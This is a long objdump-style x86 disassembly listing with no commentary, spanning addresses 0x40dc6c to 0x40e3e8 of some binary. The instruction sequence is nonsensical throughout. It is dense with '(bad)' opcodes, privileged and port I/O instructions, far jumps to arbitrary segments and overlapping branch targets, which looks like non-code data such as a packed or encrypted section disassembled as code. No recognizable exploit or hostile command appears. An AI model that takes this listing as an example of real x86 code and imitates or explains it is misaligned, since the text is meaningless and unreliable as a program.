  40dc6c:	dec    edi
  40dc6d:	sar    BYTE PTR [esi],cl
  40dc6f:	pop    ds
  40dc70:	xchg   ebp,eax
  40dc71:	mov    bh,0xf8
  40dc73:	xor    eax,0x39cd8c8
  40dc78:	mov    ah,0x1c
  40dc7a:	inc    edi
  40dc7b:	mov    dl,0x22
  40dc7d:	push   ds
  40dc7e:	loope  0x40dcb0
  40dc80:	or     DWORD PTR [ecx-0xb],ebp
  40dc83:	pop    ebx
  40dc84:	jbe    0x40dc29
  40dc86:	out    0xb1,al
  40dc88:	lahf   
  40dc89:	(bad)  
  40dc8a:	jmp    0x5fe1:0xbc71d834
  40dc91:	push   esi
  40dc92:	xchg   esp,eax
  40dc93:	aas    
  40dc94:	and    al,0x3a
  40dc96:	lahf   
  40dc97:	or     edx,DWORD PTR [ebx+edi*8+0x12]
  40dc9b:	aad    0x50
  40dc9d:	ins    DWORD PTR es:[edi],dx
  40dc9e:	sbb    eax,0xdf909d52
  40dca3:	push   es
  40dca4:	mov    eax,ds:0x68f24606
  40dca9:	cmp    DWORD PTR [ebx],esi
  40dcab:	cmp    esp,DWORD PTR [edx+0x2e92f195]
  40dcb1:	pop    esi
  40dcb2:	mov    edx,gs
  40dcb4:	aam    0x71
  40dcb6:	iret   
  40dcb7:	mov    bh,dl
  40dcb9:	loopne 0x40dc84
  40dcbb:	pop    esi
  40dcbc:	stos   BYTE PTR es:[edi],al
  40dcbd:	add    esi,DWORD PTR [eax]
  40dcbf:	adc    al,0xb3
  40dcc1:	icebp  
  40dcc2:	inc    ebx
  40dcc3:	dec    ebx
  40dcc4:	xchg   esp,esp
  40dcc6:	mov    esi,0x27d496cc
  40dccb:	por    mm4,QWORD PTR [esi+0x70aec4e]
  40dcd2:	push   eax
  40dcd3:	mov    esp,0xd9f2c485
  40dcd8:	(bad)  [esi+0x3d9d572c]
  40dcde:	sbb    bl,al
  40dce0:	out    dx,eax
  40dce1:	xor    al,0x18
  40dce3:	jmp    0x7b8b:0x3beab35d
  40dcea:	popa   
  40dceb:	outs   dx,BYTE PTR ds:[esi]
  40dcec:	and    al,0x98
  40dcee:	mov    edi,0x84a0be85
  40dcf3:	sti    
  40dcf4:	push   ebp
  40dcf5:	push   ebp
  40dcf6:	inc    edi
  40dcf7:	add    eax,0x552949e
  40dcfc:	aad    0xd1
  40dcfe:	push   es
  40dcff:	fcom   DWORD PTR [edx]
  40dd01:	push   0x64e7233a
  40dd06:	jge    0x40dce8
  40dd08:	aam    0xd
  40dd0a:	jle    0x40dcc2
  40dd0c:	sub    DWORD PTR [esi+eiz*2+0xf],ecx
  40dd10:	push   es
  40dd11:	sbb    eax,0x957adc32
  40dd16:	xchg   esp,eax
  40dd17:	ss ss mov dl,0x92
  40dd1b:	sub    al,0x3c
  40dd1d:	les    esi,FWORD PTR [ecx]
  40dd1f:	test   DWORD PTR [eax+0x58],esp
  40dd22:	popf   
  40dd23:	imul   esi,DWORD PTR [ebx+0x5a],0x60
  40dd27:	pop    ds
  40dd28:	or     eax,0x59728598
  40dd2d:	xchg   esp,eax
  40dd2f:	icebp  
  40dd30:	adc    DWORD PTR [ecx+0x47dd4707],ebp
  40dd36:	xor    DWORD PTR [eax+0x1f],eax
  40dd39:	loop   0x40dccc
  40dd3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd3c:	sub    bl,cl
  40dd3e:	cmc    
  40dd3f:	mov    ah,0xe2
  40dd41:	xchg   esp,eax
  40dd42:	leave  
  40dd43:	mov    WORD PTR [ecx-0x67],?
  40dd46:	cs aam 0xc
  40dd49:	and    BYTE PTR [ebx],cl
  40dd4b:	cdq    
  40dd4c:	sahf   
  40dd4d:	add    edx,edx
  40dd4f:	les    ebx,FWORD PTR [esi+0x29]
  40dd52:	sbb    ah,BYTE PTR [edi+0x2af9b4d8]
  40dd58:	xchg   ebp,eax
  40dd59:	pop    ecx
  40dd5a:	dec    edx
  40dd5b:	(bad)  
  40dd5c:	sub    al,0xbc
  40dd5e:	inc    edi
  40dd5f:	xchg   ebp,eax
  40dd60:	call   0x903a3cdd
  40dd65:	and    al,0x45
  40dd67:	cmp    BYTE PTR [ecx],bh
  40dd69:	mov    ebp,0xaf334f64
  40dd6e:	repz repnz cdq 
  40dd71:	fsubr  DWORD PTR [eax-0x33]
  40dd74:	ins    DWORD PTR es:[edi],dx
  40dd75:	mov    eax,ds:0x1cffba2
  40dd7a:	mul    ebx
  40dd7c:	inc    ebp
  40dd7d:	mov    eax,0x6644ab5a
  40dd82:	in     eax,dx
  40dd83:	cmp    al,0x1f
  40dd85:	mov    eax,ds:0x3173507a
  40dd8a:	aam    0xb
  40dd8c:	mov    cl,0x32
  40dd8e:	test   edi,ebp
  40dd90:	imul   edx,edi,0xffffff9c
  40dd93:	sbb    al,BYTE PTR [ebx-0x42]
  40dd96:	js     0x40de06
  40dd98:	xchg   ecx,eax
  40dd99:	jecxz  0x40dd57
  40dd9b:	and    edi,DWORD PTR [ebx+0x68]
  40dd9e:	ins    DWORD PTR es:[edi],dx
  40dd9f:	cs push edi
  40dda1:	test   al,0x74
  40dda3:	dec    edx
  40dda4:	pop    ss
  40dda5:	adc    al,0x2f
  40dda7:	je     0x40dd90
  40dda9:	sbb    eax,0x6ec0aa9e
  40ddae:	or     al,0x69
  40ddb0:	push   0xaca343c
  40ddb5:	xor    DWORD PTR [ebx+eiz*2+0x58],eax
  40ddb9:	mov    es,WORD PTR [edi]
  40ddbb:	mov    eax,edi
  40ddbd:	jecxz  0x40de29
  40ddbf:	push   ds
  40ddc0:	push   eax
  40ddc1:	jle    0x40de30
  40ddc3:	adc    DWORD PTR [edx],esp
  40ddc5:	jecxz  0x40dd4d
  40ddc7:	call   0x430603db
  40ddcc:	mov    ebx,0x4583461
  40ddd1:	sbb    BYTE PTR [edi+ebx*2-0x40],0x6
  40ddd6:	xor    al,0x21
  40ddd8:	and    DWORD PTR [edi+0x60480fe8],ebx
  40ddde:	or     dl,BYTE PTR [esi+0x3]
  40dde1:	push   ebp
  40dde2:	add    ch,ah
  40dde4:	dec    esp
  40dde5:	cli    
  40dde6:	aam    0x79
  40dde8:	push   edx
  40dde9:	cmp    eax,0x93c995f5
  40ddee:	mov    al,0x71
  40ddf0:	mov    dl,0x1d
  40ddf2:	mov    bh,0xed
  40ddf4:	fs pusha 
  40ddf6:	ss fcos 
  40ddf9:	shl    DWORD PTR [ecx-0x3],cl
  40ddfc:	sub    al,BYTE PTR ss:[ebx+ebx*8]
  40de00:	lock xchg esi,eax
  40de02:	push   cs
  40de03:	xchg   BYTE PTR [ecx-0x25],cl
  40de06:	or     DWORD PTR [esp+esi*2+0x65b29643],0x45
  40de0e:	mov    edx,0x5ea80df5
  40de13:	cld    
  40de14:	cmp    ah,BYTE PTR [ebx]
  40de16:	aas    
  40de17:	sar    BYTE PTR cs:[edx],1
  40de1a:	pop    edi
  40de1b:	push   cs
  40de1c:	lods   eax,DWORD PTR ds:[esi]
  40de1d:	ret    
  40de1e:	pop    es
  40de1f:	mov    bh,0xdb
  40de21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de22:	out    dx,al
  40de23:	out    0xb8,eax
  40de25:	dec    esp
  40de26:	jmp    0x40de60
  40de28:	mov    esi,0xbbdb9db5
  40de2d:	mov    cl,0xe3
  40de2f:	popa   
  40de30:	adc    DWORD PTR ds:0x2314d4b8,ebp
  40de36:	std    
  40de37:	dec    ebp
  40de38:	test   al,0xe4
  40de3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de3b:	lahf   
  40de3c:	retf   0xa724
  40de3f:	out    dx,eax
  40de40:	pop    edi
  40de41:	jp     0x40de7b
  40de43:	das    
  40de44:	push   esi
  40de45:	jbe    0x40de1d
  40de47:	rcr    ah,cl
  40de49:	in     al,0x11
  40de4b:	mov    ch,0x3
  40de4d:	inc    edx
  40de4e:	mov    ds:0x83c12041,eax
  40de53:	leave  
  40de54:	int3   
  40de55:	add    ebx,edx
  40de57:	clc    
  40de58:	inc    ecx
  40de59:	push   esi
  40de5a:	loope  0x40deae
  40de5c:	dec    ebp
  40de5d:	test   bl,0x6
  40de60:	and    al,0xc4
  40de62:	fnstsw WORD PTR [edi]
  40de64:	arpl   WORD PTR [ebp-0x49],di
  40de67:	and    al,0x83
  40de69:	mov    ecx,0x5518afae
  40de6e:	jle    0x40dedf
  40de70:	add    eax,DWORD PTR [esi+edx*4]
  40de73:	ror    BYTE PTR [ecx-0x4b],1
  40de76:	push   es
  40de77:	imul   esi,edi,0xc53a3164
  40de7d:	dec    ecx
  40de7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de7f:	outs   dx,BYTE PTR ds:[esi]
  40de80:	jmp    0x5e14:0xedb5fb09
  40de87:	sbb    al,0x34
  40de89:	xchg   edi,eax
  40de8a:	daa    
  40de8b:	loope  0x40de39
  40de8d:	adc    al,0xf9
  40de8f:	xchg   esp,eax
  40de90:	sbb    edx,DWORD PTR [eax+edi*2-0x6b]
  40de94:	pop    edx
  40de95:	inc    ebx
  40de96:	aad    0xc2
  40de98:	pop    eax
  40de99:	sub    al,0xb3
  40de9b:	stos   BYTE PTR es:[edi],al
  40de9c:	cmp    al,0x6d
  40de9e:	out    0xa5,eax
  40dea0:	sub    al,0x83
  40dea2:	enter  0x5d72,0xe3
  40dea6:	ss stos BYTE PTR es:[edi],al
  40dea8:	icebp  
  40dea9:	addr16 dec eax
  40deab:	jl     0x40de86
  40dead:	push   cs
  40deae:	mov    dl,0x19
  40deb0:	imul   DWORD PTR [edx]
  40deb2:	aas    
  40deb3:	inc    esp
  40deb4:	aas    
  40deb5:	cdq    
  40deb6:	jg     0x40dee8
  40deb8:	int3   
  40deb9:	fwait
  40deba:	rcl    edi,1
  40debc:	mov    ebx,edx
  40debe:	and    BYTE PTR [edi-0x354417e8],ah
  40dec4:	js     0x40de5b
  40dec6:	or     DWORD PTR [ebx],ebp
  40dec8:	sbb    ebp,0xffffffc9
  40decb:	mov    DWORD PTR [ecx+0x2b49c638],esp
  40ded1:	xchg   edx,eax
  40ded2:	sbb    al,0x26
  40ded4:	adc    al,0xd4
  40ded6:	mov    ch,0x7a
  40ded8:	fwait
  40ded9:	jp     0x40de9e
  40dedb:	dec    edx
  40dedc:	cmp    esp,DWORD PTR [ecx-0x72a35f51]
  40dee2:	cdq    
  40dee3:	nop
  40dee4:	sbb    ebp,DWORD PTR [ebp+0xfd5fff1]
  40deea:	ret    
  40deeb:	xchg   edi,eax
  40deec:	(bad)  
  40deed:	in     eax,dx
  40deee:	pop    ds
  40deef:	sbb    dh,BYTE PTR [esi+ecx*8]
  40def2:	push   cs
  40def3:	pushf  
  40def4:	jae    0x40df04
  40def6:	xor    DWORD PTR [ebx+0x504dc1ed],ebp
  40defc:	xchg   ebx,eax
  40defd:	into   
  40defe:	cmp    bh,BYTE PTR [edi+edx*2+0x1d]
  40df02:	inc    eax
  40df03:	loopne 0x40de8c
  40df05:	cmp    eax,0xf925749b
  40df0a:	jbe    0x40df19
  40df0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df0d:	mov    ds:0x99cc3173,al
  40df12:	int    0x46
  40df14:	xlat   BYTE PTR ds:[ebx]
  40df15:	sbb    DWORD PTR [esi],0xbe305d09
  40df1b:	(bad)  
  40df1c:	add    BYTE PTR [ebx],0x4c
  40df1f:	aam    0x66
  40df21:	lods   eax,DWORD PTR ds:[esi]
  40df22:	add    DWORD PTR [ecx],0x13
  40df25:	cmp    eax,0x9d7c07ca
  40df2a:	retf   
  40df2b:	pop    esp
  40df2c:	add    DWORD PTR ds:0xe1f3c9d4,0x1c383380
  40df36:	int3   
  40df37:	out    0x1c,al
  40df39:	leave  
  40df3a:	pop    ds
  40df3b:	xor    dh,BYTE PTR [ecx]
  40df3d:	pop    eax
  40df3e:	mov    cl,BYTE PTR [eax]
  40df40:	hlt    
  40df41:	call   0xf41a:0x6108534b
  40df48:	adc    ah,BYTE PTR [eax]
  40df4a:	cwde   
  40df4b:	inc    ebp
  40df4c:	rcr    DWORD PTR [esi+0x18],0xfa
  40df50:	sbb    BYTE PTR [eax-0x61],dl
  40df53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df54:	cvtps2pd xmm1,xmm1
  40df57:	ss pop ebp
  40df59:	mov    WORD PTR [edi+0x78],gs
  40df5c:	ds ret 0x66c3
  40df60:	arpl   si,si
  40df62:	call   0xeb36:0xd4c0a48
  40df69:	sbb    eax,0x426fa198
  40df6e:	arpl   di,dx
  40df70:	jns    0x40df21
  40df72:	mov    ecx,0x321b8557
  40df77:	ins    BYTE PTR es:[edi],dx
  40df78:	sub    bl,BYTE PTR [eax-0x579bea94]
  40df7e:	and    BYTE PTR [ebp+0x31],bl
  40df81:	cmp    BYTE PTR [ecx+0x65f21ba9],ch
  40df87:	loop   0x40dfd9
  40df89:	jmp    0x99e5ec7f
  40df8e:	retf   
  40df8f:	pusha  
  40df90:	mov    al,0x92
  40df92:	pop    esp
  40df93:	retf   0x66d1
  40df96:	push   esi
  40df97:	push   ss
  40df98:	add    BYTE PTR [edi+0x26],cl
  40df9b:	mov    esi,0xd8f5a0c2
  40dfa0:	add    eax,0xa0f3d3b2
  40dfa5:	arpl   WORD PTR [ebx-0x6dbb48e7],sp
  40dfab:	pusha  
  40dfac:	lea    esi,[ebx]
  40dfae:	jle    0x40dfe1
  40dfb0:	sbb    al,0xd5
  40dfb2:	ss test eax,0xf267711
  40dfb8:	or     bl,BYTE PTR [ecx-0x3e]
  40dfbb:	retf   0x7cf5
  40dfbe:	sbb    DWORD PTR [esi+edx*1],esi
  40dfc1:	xor    bh,al
  40dfc3:	cmp    edx,DWORD PTR [edx+0xd]
  40dfc6:	mul    BYTE PTR [ecx]
  40dfc8:	xchg   ecx,eax
  40dfc9:	push   ds
  40dfca:	lds    edx,FWORD PTR [eax]
  40dfcc:	daa    
  40dfcd:	mov    ds:0x3422f617,al
  40dfd2:	xchg   esi,eax
  40dfd3:	mov    al,0xe6
  40dfd5:	jp     0x40df98
  40dfd7:	adc    cl,BYTE PTR [ecx]
  40dfd9:	fs push esi
  40dfdb:	in     eax,dx
  40dfdc:	inc    ebp
  40dfdd:	mov    al,0x52
  40dfdf:	dec    ebp
  40dfe0:	popf   
  40dfe1:	cdq    
  40dfe2:	or     esp,DWORD PTR [edx-0x72]
  40dfe5:	cwde   
  40dfe6:	pop    es
  40dfe7:	popf   
  40dfe8:	sub    DWORD PTR [ebp-0x1c],esi
  40dfeb:	shl    DWORD PTR [edi],cl
  40dfed:	les    ecx,FWORD PTR fs:[edi-0x5e5410cb]
  40dff4:	sbb    ebp,DWORD PTR [edx-0x6b]
  40dff7:	lea    ecx,[ecx+eiz*1]
  40dffa:	scas   al,BYTE PTR es:[edi]
  40dffb:	daa    
  40dffc:	jmp    0xaad8:0x21b1baf7
  40e003:	ret    0x3ee7
  40e006:	(bad)  
  40e007:	pusha  
  40e008:	jecxz  0x40e037
  40e00a:	mov    dl,0xca
  40e00c:	test   al,0xbb
  40e00e:	sub    dh,BYTE PTR [ecx-0x39485734]
  40e014:	add    al,0xb4
  40e016:	mov    ch,0x94
  40e018:	or     BYTE PTR [eax+edi*2],0x16
  40e01c:	ins    BYTE PTR es:[edi],dx
  40e01d:	adc    BYTE PTR [ebp-0x6740cff4],ah
  40e023:	loopne 0x40e055
  40e025:	(bad)
  40e02a:	lds    ebx,FWORD PTR [eax+0x5d]
  40e02d:	xor    BYTE PTR [ebx-0x47],cl
  40e030:	das    
  40e031:	cwde   
  40e032:	push   ebp
  40e033:	sbb    eax,0x13b8cec7
  40e038:	jnp    0x40e044
  40e03a:	add    DWORD PTR gs:[ecx+0x59],eax
  40e03e:	add    DWORD PTR [esi+ebx*8+0x2a809a43],edi
  40e045:	pop    ebp
  40e046:	push   ds
  40e047:	stc    
  40e048:	lds    ebx,FWORD PTR [edi-0x2f5e07be]
  40e04e:	cmp    eax,0xe160c33f
  40e053:	xchg   esp,eax
  40e054:	push   ds
  40e055:	mov    al,0xba
  40e057:	fcom   QWORD PTR [edi-0x25292ac2]
  40e05d:	lods   eax,DWORD PTR ds:[esi]
  40e05e:	jno    0x40dff8
  40e060:	sub    al,0xc9
  40e062:	js     0x40e0a4
  40e064:	and    ebp,DWORD PTR [esi-0x2d]
  40e067:	pop    ds
  40e068:	jbe    0x40e0d9
  40e06a:	and    ebx,esp
  40e06c:	or     ebp,esp
  40e06e:	arpl   WORD PTR [ebp+0x38c17c72],dx
  40e074:	fidiv  DWORD PTR [ebp+0x22a8d6a4]
  40e07a:	push   0xdc822ff5
  40e07f:	sar    al,1
  40e081:	cdq    
  40e082:	ja     0x40e004
  40e084:	pop    esi
  40e085:	adc    esp,DWORD PTR [edx]
  40e087:	inc    ecx
  40e088:	popf   
  40e089:	dec    ebx
  40e08a:	cmp    eax,DWORD PTR [ebx+0x76]
  40e08d:	push   es
  40e08e:	xor    edx,DWORD PTR [edx]
  40e090:	ins    DWORD PTR es:[edi],dx
  40e091:	mov    ebp,0x669c58ee
  40e096:	xor    al,0x11
  40e098:	outs   dx,DWORD PTR ds:[esi]
  40e099:	stos   DWORD PTR es:[edi],eax
  40e09a:	jmp    0xb48021e2
  40e09f:	mov    ah,0x0
  40e0a1:	neg    DWORD PTR [ecx+0x597b126]
  40e0a7:	lods   eax,DWORD PTR ds:[esi]
  40e0a8:	jno    0x40e034
  40e0aa:	add    DWORD PTR [esi],0x4d328619
  40e0b0:	add    edx,edi
  40e0b2:	cwde   
  40e0b3:	inc    ecx
  40e0b4:	clc    
  40e0b5:	mov    esp,0xc0b983c7
  40e0ba:	adc    esp,DWORD PTR ds:0x8f318a43
  40e0c0:	stc    
  40e0c1:	adc    BYTE PTR [edx+ebx*1],bh
  40e0c4:	repnz xor BYTE PTR es:[edx],bl
  40e0c8:	dec    esp
  40e0c9:	popf   
  40e0ca:	mov    esp,0x7e19b3da
  40e0cf:	test   al,0x78
  40e0d1:	cmp    dh,dl
  40e0d3:	out    0x52,al
  40e0d5:	fs pushf 
  40e0d7:	pop    esp
  40e0d8:	test   eax,0xfc7e6d4c
  40e0dd:	or     DWORD PTR [ebp-0x707c2013],eax
  40e0e3:	mov    bl,0x26
  40e0e5:	sub    eax,edx
  40e0e7:	lods   al,BYTE PTR ds:[esi]
  40e0e8:	adc    BYTE PTR ds:0x93972900,bl
  40e0ee:	(bad)  
  40e0ef:	ficom  WORD PTR [edi-0x3]
  40e0f2:	sub    DWORD PTR [ecx],esp
  40e0f4:	sbb    DWORD PTR [ebp-0x78cd852b],0xffffffc9
  40e0fb:	stc    
  40e0fc:	xchg   esi,eax
  40e0fd:	fwait
  40e0fe:	(bad)  
  40e0ff:	ror    DWORD PTR [edi-0x54587ff7],cl
  40e105:	xchg   bh,cl
  40e107:	neg    DWORD PTR [edx+0x49]
  40e10a:	inc    esi
  40e10b:	ficom  WORD PTR [edi+0x7c80bd38]
  40e111:	xor    eax,0x7bc1cb01
  40e116:	lea    eax,[edi-0x21c1dd89]
  40e11c:	out    0x92,eax
  40e11e:	cmp    DWORD PTR [edi],esi
  40e120:	test   DWORD PTR [edx+0x29de0e66],0x4648fe59
  40e12a:	pop    ds
  40e12b:	cmp    ebp,edx
  40e12d:	loop   0x40e0f9
  40e12f:	and    DWORD PTR [eax-0x48],esi
  40e132:	push   ebx
  40e133:	sub    ah,BYTE PTR [ecx-0x28]
  40e136:	das    
  40e137:	jnp    0x40e18b
  40e139:	cmp    BYTE PTR [edx-0x67cb7161],al
  40e13f:	xlat   BYTE PTR ds:[ebx]
  40e140:	add    DWORD PTR [eax],edi
  40e142:	dec    edi
  40e143:	or     eax,0x3dcf89d8
  40e148:	jmp    0xa0d537d0
  40e14d:	repz scas eax,DWORD PTR es:[edi]
  40e14f:	arpl   bx,bp
  40e151:	pop    esi
  40e152:	in     eax,0x59
  40e154:	inc    ebp
  40e155:	in     al,0x16
  40e157:	aam    0x65
  40e159:	push   eax
  40e15a:	jecxz  0x40e0ff
  40e15c:	test   eax,0x7ceb7c7
  40e161:	push   esp
  40e162:	pop    esp
  40e163:	outs   dx,BYTE PTR ds:[esi]
  40e164:	je     0x40e0eb
  40e166:	(bad)  
  40e167:	outs   dx,DWORD PTR ds:[esi]
  40e168:	mov    ebx,0x16cc82e5
  40e16d:	shl    BYTE PTR [esi+0x85abdf1],0xa3
  40e174:	add    al,0xb7
  40e176:	dec    ecx
  40e177:	and    BYTE PTR [ecx+0x294f2967],cl
  40e17d:	das    
  40e17e:	aam    0x62
  40e180:	sub    BYTE PTR [eax+0x2f],bh
  40e183:	pusha  
  40e184:	add    al,0x7b
  40e186:	jp     0x40e1bc
  40e188:	pop    edi
  40e189:	and    ebp,DWORD PTR [eax+0x68]
  40e18c:	push   esi
  40e18d:	xor    eax,0x74b017cf
  40e192:	jo     0x40e168
  40e194:	lods   eax,DWORD PTR ds:[esi]
  40e195:	or     eax,0x49992fc
  40e19a:	call   0xa78b:0xf392208d
  40e1a1:	retf   0x79b0
  40e1a4:	inc    edx
  40e1a5:	mov    esi,0x76b59f17
  40e1aa:	imul   esi,edx,0x6bb0251b
  40e1b0:	retf   
  40e1b1:	loope  0x40e208
  40e1b3:	push   es
  40e1b4:	gs jle 0x40e1b0
  40e1b7:	ret    0x47e1
  40e1ba:	mov    al,0x8
  40e1bc:	mov    eax,0xef54ba9f
  40e1c1:	ins    DWORD PTR es:[edi],dx
  40e1c2:	cmp    DWORD PTR [esi+0x370599b4],eax
  40e1c8:	mov    ah,0xee
  40e1ca:	and    ch,BYTE PTR [eax]
  40e1cc:	jg     0x40e19f
  40e1ce:	inc    ebx
  40e1cf:	jl     0x40e1e4
  40e1d1:	cmp    bl,cl
  40e1d3:	jo     0x40e1d3
  40e1d5:	mov    ebp,0x549d45ba
  40e1da:	jbe    0x40e1db
  40e1dc:	add    bl,al
  40e1de:	pop    edx
  40e1df:	mov    edi,0x8e8dffba
  40e1e4:	sahf   
  40e1e5:	sub    ch,ah
  40e1e7:	push   eax
  40e1e8:	mul    DWORD PTR [edi+0x13]
  40e1eb:	mov    ecx,0x15b3e8ca
  40e1f0:	dec    ecx
  40e1f1:	adc    edi,DWORD PTR ds:0xb554a290
  40e1f7:	fimul  DWORD PTR [eax-0x53e0ec07]
  40e1fd:	icebp  
  40e1fe:	dec    esp
  40e1ff:	das    
  40e200:	push   ebx
  40e201:	into   
  40e202:	dec    ecx
  40e203:	cmp    BYTE PTR [esi-0x662ba776],ah
  40e209:	out    dx,eax
  40e20a:	pushf  
  40e20b:	adc    DWORD PTR [ebp-0x20],edx
  40e20e:	test   DWORD PTR [ecx-0x5d147761],ebp
  40e214:	fisttp WORD PTR [ebx+0x47]
  40e217:	ds push eax
  40e219:	es int3 
  40e21b:	mov    ebx,0xa729539b
  40e220:	and    DWORD PTR [eax+0x154656ec],edx
  40e226:	or     BYTE PTR fs:0x26f7050b,0x95
  40e22e:	adc    eax,0x426363bc
  40e233:	adc    eax,0x1daa5b5a
  40e238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e239:	sbb    DWORD PTR ds:0xa2a809c1,ebx
  40e23f:	mov    dh,0x5b
  40e241:	xchg   BYTE PTR [ebx+ecx*8-0x6e8259c],ch
  40e248:	aam    0x50
  40e24a:	jle    0x40e23c
  40e24c:	pop    edx
  40e24d:	outs   dx,BYTE PTR ds:[esi]
  40e24e:	mov    dh,0x47
  40e250:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40e252:	out    dx,eax
  40e253:	imul   DWORD PTR [ecx+0x4f33c1cb]
  40e259:	sbb    eax,0xf5d7ec0e
  40e25e:	test   DWORD PTR [eax+esi*4+0x7c],edx
  40e262:	pusha  
  40e263:	(bad)  
  40e265:	(bad)
  40e269:	out    0xa0,eax
  40e26b:	cmp    al,0x21
  40e26d:	into   
  40e26e:	shr    DWORD PTR [edx-0x68],0x7b
  40e272:	bound  esi,QWORD PTR [ecx+0x28]
  40e275:	add    WORD PTR [ebp-0x1931b3ce],dx
  40e27c:	out    0x95,al
  40e27e:	leave  
  40e27f:	sub    ebp,esi
  40e281:	and    DWORD PTR [edx+0x31564c48],esp
  40e287:	pop    ebx
  40e288:	mov    cl,0xdc
  40e28a:	outs   dx,BYTE PTR ds:[esi]
  40e28b:	and    al,BYTE PTR [ebp+0x7d]
  40e28e:	mov    esi,0x480644d1
  40e293:	add    esi,ecx
  40e295:	xchg   edx,eax
  40e296:	lds    esp,FWORD PTR [edx-0x58]
  40e299:	in     eax,dx
  40e29a:	mov    edi,0x6a222fd6
  40e29f:	xor    cl,bh
  40e2a1:	call   0x793b61cc
  40e2a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2a7:	lock je 0x40e23d
  40e2aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ab:	mov    DWORD PTR [edi-0x64352c70],esi
  40e2b1:	mov    eax,0xb458e513
  40e2b6:	mov    edx,DWORD PTR [edx+ebp*4]
  40e2b9:	mov    edx,0xfa347593
  40e2be:	mov    dl,0xef
  40e2c0:	jge    0x40e249
  40e2c2:	and    eax,0xff48cdbf
  40e2c7:	or     DWORD PTR [ebx+0x7360790],esi
  40e2cd:	xchg   edx,eax
  40e2ce:	sbb    ah,BYTE PTR [edi+0x51d442e5]
  40e2d4:	xchg   ebx,eax
  40e2d5:	lds    esp,FWORD PTR [ebx+0x52]
  40e2d8:	and    DWORD PTR [ebp-0x25654dea],ebx
  40e2de:	adc    eax,0x41ff7f5d
  40e2e3:	dec    edx
  40e2e4:	pop    esi
  40e2e5:	lods   al,BYTE PTR ds:[esi]
  40e2e6:	push   ebp
  40e2e7:	inc    ebp
  40e2e8:	lds    ecx,FWORD PTR [ecx+0x4b]
  40e2eb:	push   esp
  40e2ec:	mov    edi,0x9da0558a
  40e2f1:	dec    eax
  40e2f2:	repz imul edx,DWORD PTR [edi-0x3b9d830c],0xffffffac
  40e2fa:	lock pop esi
  40e2fc:	xchg   esi,eax
  40e2fd:	push   edx
  40e2fe:	(bad)  
  40e2ff:	(bad)  
  40e301:	data16 jo 0x40e2a7
  40e304:	jp     0x40e2a9
  40e306:	rcr    DWORD PTR [esi-0x1e],cl
  40e309:	hlt    
  40e30a:	(bad)  
  40e30b:	jle    0x40e374
  40e30d:	xor    eax,0x997224b6
  40e312:	jmp    0x71b5fd6f
  40e317:	rol    BYTE PTR [esi-0x4efd39e4],0x18
  40e31e:	pop    esp
  40e31f:	dec    edx
  40e320:	jecxz  0x40e305
  40e322:	jnp    0x40e32b
  40e324:	push   0x30771d10
  40e329:	lds    ebp,FWORD PTR [edx+0x28]
  40e32c:	pusha  
  40e32d:	out    dx,eax
  40e32e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e32f:	repnz sbb esi,ebx
  40e332:	cmp    al,0xc9
  40e334:	jmp    0x80faa3fb
  40e339:	sub    esp,eax
  40e33b:	sbb    BYTE PTR [edx],al
  40e33d:	pop    es
  40e33e:	test   dl,al
  40e340:	mov    ah,0x20
  40e342:	cmc    
  40e343:	sbb    al,0x78
  40e345:	push   0x59
  40e347:	das    
  40e348:	jp     0x40e349
  40e34a:	push   es
  40e34b:	xor    al,0xa3
  40e34d:	fistp  WORD PTR [ecx]
  40e34f:	push   0x21
  40e351:	add    eax,esp
  40e353:	jne    0x40e372
  40e355:	jmp    0x40e3ca
  40e357:	mov    DWORD PTR [esi],ecx
  40e359:	int3   
  40e35a:	mov    ah,0x69
  40e35c:	cmc    
  40e35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e35e:	stos   DWORD PTR es:[edi],eax
  40e35f:	jmp    0xfd517d7c
  40e364:	pop    ds
  40e365:	pop    ds
  40e366:	push   eax
  40e367:	test   al,0x10
  40e369:	dec    esi
  40e36a:	cs aaa 
  40e36c:	ret    
  40e36d:	xor    BYTE PTR [edx],0xfb
  40e370:	lods   eax,DWORD PTR ds:[esi]
  40e371:	mov    ?,ecx
  40e373:	jo     0x40e3a1
  40e375:	ror    ecx,0x2f
  40e378:	lds    ecx,FWORD PTR [edx-0x401cbdea]
  40e37e:	(bad)  [esi]
  40e380:	repz bswap edx
  40e383:	fld    DWORD PTR [eax+ebx*4+0x26]
  40e387:	out    0x6a,al
  40e389:	fnstsw WORD PTR [esp+ebx*4-0x2e0e8eea]
  40e390:	inc    esp
  40e391:	out    dx,al
  40e392:	push   0xffffffa9
  40e394:	sub    DWORD PTR [ebx],0x57a84029
  40e39a:	pop    ss
  40e39b:	in     al,dx
  40e39c:	sar    DWORD PTR [ebp+ebx*4+0x1c],0xb0
  40e3a1:	mov    edx,0xb03b9d38
  40e3a6:	fisttp WORD PTR ds:0x8a51e6f7
  40e3ac:	pushf  
  40e3ad:	pop    esi
  40e3ae:	dec    esp
  40e3af:	xor    bh,BYTE PTR [ecx+eax*8+0x3c811629]
  40e3b6:	ror    BYTE PTR [eax],cl
  40e3b8:	stc    
  40e3b9:	xor    DWORD PTR [ebp-0x32],0xffffffb3
  40e3bd:	sbb    ah,BYTE PTR [edx-0x17]
  40e3c0:	inc    edi
  40e3c1:	jne    0x40e3c9
  40e3c3:	shl    DWORD PTR [edi],1
  40e3c5:	jne    0x40e42f
  40e3c7:	nop
  40e3c8:	add    eax,0x7db40c12
  40e3cd:	xor    DWORD PTR [edx],0x235a6d46
  40e3d3:	enter  0xd8e7,0x67
  40e3d7:	pop    ecx
  40e3d8:	mov    al,ds:0x27d413c8
  40e3dd:	adc    eax,0xb79d8615
  40e3e2:	adc    eax,DWORD PTR [edi+0x2973be4f]
  40e3e8:	sbb    DWORD PTR [esi-0x63edaf81],0xffffff9c
